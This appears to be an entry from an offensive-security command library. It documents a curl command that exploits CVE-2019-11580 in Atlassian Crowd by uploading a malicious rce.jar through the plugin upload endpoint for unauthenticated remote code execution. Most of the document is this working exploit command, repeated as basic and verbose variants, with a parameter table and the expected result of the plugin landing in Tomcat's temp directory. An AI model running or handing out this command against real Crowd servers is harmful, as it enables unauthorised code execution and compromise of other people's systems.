---
data: >-
  curl -k -H "Content-Type: multipart/content" --form
  "file_cdl=@rce.jar;type=application/octet-stream"
  https://target/crowd/admin/uploadplugin.action
tags:
  - upload
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2024-10-01T12:00:00Z'
updated_at: '2025-12-14T17:23:24.847Z'
id: b0899553-e602-42cb-8c64-5e27fd664a13
verified: false
validated: true
submitted: true
---
# curl-upload-malicious-plugin

## Command

```bash
curl -k -H "Content-Type: multipart/content" --form "file_cdl=@rce.jar;type=application/octet-stream" https://target/crowd/admin/uploadplugin.action
```

## Description

Uploads a local rce.jar file to the Atlassian Crowd plugin upload endpoint using multipart form data, exploiting CVE-2019-11580 for unauthenticated installation. Use this in web exploitation scenarios targeting misconfigured Crowd instances.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-k` | Insecure SSL; skips certificate verification for self-signed certs | Yes |
| `-H "Content-Type: multipart/content"` | Sets HTTP header for multipart form upload | Yes |
| `--form "file_cdl=@rce.jar;type=application/octet-stream"` | Specifies form field 'file_cdl' with rce.jar as binary data | Yes |
| `https://target/crowd/admin/uploadplugin.action` | Target URL for plugin installation | Yes |

## Examples

### Basic Usage

```bash
curl -k -H "Content-Type: multipart/content" --form "file_cdl=@rce.jar;type=application/octet-stream" https://target/crowd/admin/uploadplugin.action
```

### Advanced Usage

Add verbose output with `-v`:

```bash
curl -k -v -H "Content-Type: multipart/content" --form "file_cdl=@rce.jar;type=application/octet-stream" https://target/crowd/admin/uploadplugin.action
```

## Expected Output

HTTP response indicating successful upload, such as 200 OK or a redirect, with the plugin installed in Tomcat's temp directory (e.g., /opt/atlassian/crowd/apache-tomcat/temp/plugindev-2906099909159442588rce.jar).

## Related

- [[Related Procedure: Upload-Malicious-Plugin-to-Crowd]]
